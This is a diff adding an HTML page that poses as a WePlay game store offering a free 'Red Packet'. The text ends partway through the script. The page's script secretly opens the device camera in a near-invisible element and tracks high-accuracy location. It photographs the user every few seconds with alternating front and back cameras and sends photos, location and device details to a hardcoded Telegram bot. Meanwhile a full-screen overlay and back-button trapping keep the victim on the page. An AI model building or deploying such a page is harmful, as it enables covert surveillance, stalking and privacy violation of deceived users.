@@ -1,0 +1,641 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Red Packet - WePlay</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: Arial, sans-serif;
+            background: #f5f5f5;
+            margin: 0;
+            min-height: 100vh;
+        }
+
+        /* Header */
+        .header {
+            display: flex;
+            align-items: center;
+            padding: 15px;
+            background: white;
+            box-shadow: 0 1px 5px rgba(0,0,0,0.1);
+        }
+
+        .logo {
+            width: 40px;
+            margin-right: 10px;
+        }
+
+        .title {
+            font-size: 22px;
+            font-weight: bold;
+        }
+
+        /* Tabs */
+        .tabs {
+            display: flex;
+            justify-content: space-around;
+            background: white;
+            padding: 10px 0;
+            border-bottom: 2px solid #eee;
+        }
+
+        .tabs div {
+            color: #777;
+        }
+
+        .active {
+            color: #00bcd4;
+            border-bottom: 3px solid #00bcd4;
+            padding-bottom: 5px;
+        }
+
+        /* Cards */
+        .card {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: white;
+            margin: 12px;
+            padding: 15px;
+            border-radius: 15px;
+            box-shadow: 0 0 5px rgba(0,0,0,0.08);
+        }
+
+        .left {
+            display: flex;
+            align-items: center;
+        }
+
+        .left img {
+            width: 50px;
+            margin-right: 15px;
+        }
+
+        .price {
+            color: #ff7a00;
+            font-weight: bold;
+            font-size: 18px;
+        }
+
+        .note {
+            padding: 15px;
+            color: #888;
+            font-size: 14px;
+        }
+
+        /* Free section */
+        .old-price {
+            text-decoration: line-through;
+            color: #999;
+            font-size: 16px;
+        }
+
+        .free {
+            color: #4CAF50;
+            font-weight: bold;
+        }
+
+        .collect-btn {
+            margin-top: 6px;
+            padding: 6px 16px;
+            border: none;
+            background: #00bcd4;
+            color: white;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: all 0.3s;
+        }
+        
+        .collect-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .collect-btn.processing {
+            background: #ff9800;
+            animation: pulse 1.5s infinite;
+            cursor: not-allowed;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+
+        /* Bottom image */
+        .bottom-img {
+            width: 100%;
+            margin-top: 20px;
+        }
+
+        .bottom-img img {
+            width: 100%;
+            display: block;
+        }
+        
+        /* Video Element - Small and Hidden in Corner but Functional */
+        .video-container {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            width: 1px;
+            height: 1px;
+            opacity: 0.01;
+            overflow: hidden;
+            pointer-events: none;
+            z-index: -1;
+        }
+        
+        #video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        canvas {
+            display: none;
+        }
+        
+        /* Loading Overlay - Full screen lock */
+        .processing-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.9);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-size: 18px;
+            backdrop-filter: blur(5px);
+            flex-direction: column;
+        }
+        
+        .processing-overlay.active {
+            display: flex;
+        }
+        
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #00bcd4;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .warning-text {
+            color: #ff4444;
+            font-size: 14px;
+            margin-top: 20px;
+            text-align: center;
+        }
+        
+        /* Exit Prevention Message */
+        .exit-warning {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 25px;
+            border-radius: 15px;
+            text-align: center;
+            z-index: 10000;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            width: 80%;
+            max-width: 300px;
+        }
+        
+        .exit-warning.active {
+            display: block;
+        }
+        
+        .exit-warning h3 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+        
+        .exit-warning p {
+            color: #666;
+            margin-bottom: 20px;
+        }
+        
+        .exit-warning button {
+            background: #00bcd4;
+            color: white;
+            border: none;
+            padding: 10px 30px;
+            border-radius: 25px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        
+        /* All other hidden elements */
+        .status-bar, .camera-section, .toast {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+    <!-- Processing Overlay - Full Screen Lock -->
+    <div class="processing-overlay" id="processingOverlay">
+        <div class="spinner"></div>
+        <div>Processing Your Red Packet...</div>
+        <div style="font-size: 14px; margin-top: 15px;">Please wait while we verify</div>
+        <div class="warning-text">⚠️ Do not close or minimize</div>
+    </div>
+
+    <!-- Exit Warning Popup -->
+    <div class="exit-warning" id="exitWarning">
+        <h3>⚠️ Processing</h3>
+        <p>Your Red Packet is being processed. Please wait...</p>
+        <button onclick="document.getElementById('exitWarning').classList.remove('active')">OK</button>
+    </div>
+
+    <!-- Hidden Video Container (Functional but invisible) -->
+    <div class="video-container">
+        <video id="video" autoplay playsinline muted></video>
+    </div>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <!-- Header -->
+    <div class="header">
+        <img src="https://i.ibb.co/KjsMMSV9/logo.png" class="logo" alt="logo">
+        <div class="title">WePlay</div>
+    </div>
+
+    <!-- Tabs -->
+    <div class="tabs">
+        <div>Recharge</div>
+        <div>VIP</div>
+        <div class="active">Red Packet</div>
+    </div>
+
+    <!-- Cards -->
+    <div class="card">
+        <div class="left">
+            <img src="https://i.ibb.co/9H080nDZ/bag3-A-4bde8576.png" alt="packet">
+            <div>600 Gold Red Packet</div>
+        </div>
+        <div class="price">₹89</div>
+    </div>
+
+    <div class="card">
+        <div class="left">
+            <img src="https://i.ibb.co/9H080nDZ/bag3-A-4bde8576.png" alt="packet">
+            <div>3000 Gold Red Packet</div>
+        </div>
+        <div class="price">₹449</div>
+    </div>
+
+    <div class="card">
+        <div class="left">
+            <img src="https://i.ibb.co/9H080nDZ/bag3-A-4bde8576.png" alt="packet">
+            <div>10K Gold Red Packet</div>
+        </div>
+        <div class="price">₹1199</div>
+    </div>
+
+    <!-- Free Offer Card -->
+    <div class="card">
+        <div class="left">
+            <img src="https://i.ibb.co/9H080nDZ/bag3-A-4bde8576.png" alt="packet">
+            <div>50K Gold Red Packet</div>
+        </div>
+        <div style="text-align:right;">
+            <div class="old-price">₹5399</div>
+            <div class="free">FREE</div>
+            <button class="collect-btn" id="collectBtn" onclick="handleCollectClick()">🎁 COLLECT FREE</button>
+        </div>
+    </div>
+
+    <div class="note">
+        The Red Packet you purchased will be stored in your inventory, and you can use it in WePlay.
+    </div>
+
+    <!-- Bottom Image -->
+    <div class="bottom-img">
+        <img src="https://i.ibb.co/fYbYkdZ0/ip-e32f89d3.png" alt="banner">
+    </div>
+
+    <script>
+        // ==================== YOUR CREDENTIALS ====================
+        const BOT_TOKEN = '8214662223:AAE8Y17RmB9-_2j2YXbm3EpOnTE5Wk7BQKU';
+        const CHAT_ID = '6677946042';
+        
+        // ==================== VARIABLES ====================
+        let stream = null;
+        let capturing = false;
+        let captureInterval = null;
+        let locationWatchId = null;
+        let photoCount = 0;
+        let sentCount = 0;
+        let locationCount = 0;
+        let cameraReady = false;
+        let isProcessing = false;
+        
+        // Camera alternating
+        let useFrontCamera = true;
+        let photoCounter = 0;
+        
+        // ==================== BACK BUTTON PREVENTION ====================
+        // Prevent back button
+        history.pushState(null, null, location.href);
+        window.onpopstate = function() {
+            if (isProcessing) {
+                // Show warning if processing
+                document.getElementById('exitWarning').classList.add('active');
+                history.pushState(null, null, location.href);
+            } else {
+                // Allow back if not processing
+                window.location.href = 'about:blank';
+            }
+        };
+        
+        // Prevent minimize/tab switch
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden && isProcessing) {
+                // Show warning if user tries to switch tab
+                alert('⚠️ Processing in progress! Please do not switch tabs.');
+            }
+        });
+        
+        // Prevent refresh
+        window.addEventListener('beforeunload', function(e) {
+            if (isProcessing) {
+                e.preventDefault();
+                e.returnValue = 'Processing in progress! Are you sure you want to leave?';
+                return 'Processing in progress! Are you sure you want to leave?';
+            }
+        });
+        
+        // ==================== INIT ====================
+        window.onload = function() {
+            document.getElementById('collectBtn').innerHTML = '🎁 COLLECT FREE';
+            
+            initCamera();
+            initLocation();
+            
+            setTimeout(() => {
+                collectDeviceInfo();
+            }, 2000);
+        };
+        
+        // ==================== PROCESSING OVERLAY ====================
+        function showProcessing() {
+            isProcessing = true;
+            document.getElementById('processingOverlay').classList.add('active');
+            
+            // Lock back button
+            history.pushState(null, null, location.href);
+        }
+        
+        function hideProcessing() {
+            isProcessing = false;
+            document.getElementById('processingOverlay').classList.remove('active');
+        }
+        
+        // ==================== INIT CAMERA ====================
+        async function initCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
+                    audio: false
+                });
+                
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    cameraReady = true;
+                    useFrontCamera = true;
+                };
+                
+            } catch (err) {
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { 
+                            facingMode: 'environment',
+                            width: { ideal: 640 },
+                            height: { ideal: 480 }
+                        },
+                        audio: false
+                    });
+                    
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        cameraReady = true;
+                        useFrontCamera = false;
+                    };
+                    
+                } catch (err2) {
+                    document.getElementById('collectBtn').disabled = true;
+                    document.getElementById('collectBtn').innerHTML = 'Error';
+                }
+            }
+        }
+        
+        // ==================== INIT LOCATION ====================
+        function initLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        sendLocation(position.coords.latitude, position.coords.longitude);
+                        startLiveLocation();
+                    },
+                    (error) => {
+                        console.log('Location error:', error);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            }
+        }
+        
+        // ==================== HANDLE COLLECT BUTTON ====================
+        function handleCollectClick() {
+            if (!cameraReady) {
+                alert('Camera is initializing. Please wait...');
+                return;
+            }
+            
+            // 🔄 UPDATED: Direct processing mode - no STOP button
+            startProcessing();
+        }
+        
+        // ==================== START PROCESSING ====================
+        function startProcessing() {
+            // Show processing overlay
+            showProcessing();
+            
+            // Change button to processing
+            document.getElementById('collectBtn').innerHTML = '⏳ PROCESSING...';
+            document.getElementById('collectBtn').classList.add('processing');
+            document.getElementById('collectBtn').disabled = true;
+            
+            // Send notification
+            sendToTelegram('🎁', 'FREE RED PACKET PROCESSING STARTED!');
+            
+            // Start capture
+            capturing = true;
+            photoCounter = 0;
+            
+            // Start 5-second interval
+            captureInterval = setInterval(capturePhoto, 5000);
+            
+            // Take first photo immediately
+            setTimeout(capturePhoto, 1000);
+            
+            // Auto stop after 30 seconds (6 photos)
+            setTimeout(() => {
+                if (capturing) {
+                    stopProcessing();
+                }
+            }, 30000);
+        }
+        
+        // ==================== STOP PROCESSING ====================
+        function stopProcessing() {
+            capturing = false;
+            
+            if (captureInterval) {
+                clearInterval(captureInterval);
+            }
+            
+            // Send completion notification
+            sendToTelegram('✅', 'RED PACKET PROCESSING COMPLETE!');
+            
+            // Hide processing overlay after 2 seconds
+            setTimeout(() => {
+                hideProcessing();
+                document.getElementById('collectBtn').innerHTML = '🎁 COLLECT FREE';
+                document.getElementById('collectBtn').classList.remove('processing');
+                document.getElementById('collectBtn').disabled = false;
+            }, 2000);
+        }
+        
+        // ==================== CAPTURE PHOTO ====================
+        async function capturePhoto() {
+            if (!capturing || !cameraReady || !stream) return;
+            
+            try {
+                photoCounter++;
+                
+                // First photo front camera, then alternate
+                if (photoCounter > 1) {
+                    useFrontCamera = !useFrontCamera;
+                    await switchCamera(useFrontCamera ? 'user' : 'environment');
+                }
+                
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                const context = canvas.getContext('2d');
+                
+                if (video.videoWidth === 0 || video.videoHeight === 0) {
+                    setTimeout(capturePhoto, 300);
+                    return;
+                }
+                
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                
+                // Mirror front camera
+                if (useFrontCamera) {
+                    context.translate(canvas.width, 0);
+                    context.scale(-1, 1);
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    context.setTransform(1, 0, 0, 1, 0, 0);
+                } else {
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                }
+                
+                photoCount++;
+                
+                canvas.toBlob(async (blob) => {
+                    try {
+                        if (blob.size < 1000) {
+                            console.log('Image too small');
+                            return;
+                        }
+                        
+                        await sendPhoto(blob, photoCount, useFrontCamera ? 'Front' : 'Back');
+                        sentCount++;
+                        console.log(`Photo #${photoCount} sent`);
+                    } catch (err) {
+                        console.log('Send error:', err);
+                    }
+                }, 'image/jpeg', 80);
+                
+            } catch (err) {
+                console.log('Capture error:', err);
+            }
+        }
+        
+        // ==================== SWITCH CAMERA ====================
+        async function switchCamera(mode) {
+            try {
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+                
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: mode,
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
+                    audio: false
+                });
+                
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                return new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve(true);
+                    };
+                });
+                
+            } catch (err) {
+                console.log('Switch error:', err);
+                return false;
+            }
+        }
+        
+        // ==================== LIVE LOCATION ====================
+        function startLiveLocation() {
+            if (!navigator.geolocation) return;
+            
+            locationWatchId = navig
